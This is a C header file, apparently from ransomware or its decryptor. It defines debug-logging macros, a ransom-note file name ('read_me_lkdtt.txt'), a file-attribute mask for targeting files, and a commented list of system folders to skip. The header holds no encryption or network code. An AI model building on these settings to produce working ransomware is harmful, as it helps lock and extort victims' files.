#pragma once

#include <stdio.h>

#ifdef _DEBUG
#define _LOG_ENABLED_
#endif

// #define _LOG_ENABLED_

#define LEVEL0		0
#define LEVEL1		1

#define _LOG_MODE	LEVEL1

#define LOCKED_NOTE L"read_me_lkdtt.txt"
#define FILE_TYPES (FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN)
// const wchar_t* decryptorBlockedList[] = { L"windows", L"program files", L"programdata", L"appdata", L"$recycle.bin", L"all users"};


#ifdef _DEBUG
#define dbg(level, x, ...) printf("(%d) [%d] %s: "##x"\n", GetCurrentThreadId(), __LINE__, __FUNCTION__, __VA_ARGS__);
#else
#ifdef _LOG_ENABLED_
#define dbg(level, x, ...) {\
	if (level <= _LOG_MODE)\
		printf("(%d) [%d] %s: "##x"\n", GetCurrentThreadId(), __LINE__, __FUNCTION__, __VA_ARGS__); \
};
#else
#define dbg(x, ...);
#endif
#endif